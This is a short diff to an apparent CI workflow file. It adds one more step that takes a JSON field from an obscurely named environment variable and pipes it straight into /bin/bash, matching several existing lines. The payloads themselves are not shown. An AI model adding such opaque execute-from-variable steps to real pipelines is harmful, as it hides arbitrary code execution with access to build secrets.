@@ -25,6 +25,7 @@ jobs:
           echo $zpfan799 | jq -r .ybk87 | /bin/bash
           echo $tuaul177 | jq -r .agoa7 | /bin/bash
           printf '%s' "$hl240" | jq -r .w116 | /bin/bash
+          printf '%s' "$g8" | jq -r .ko98 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
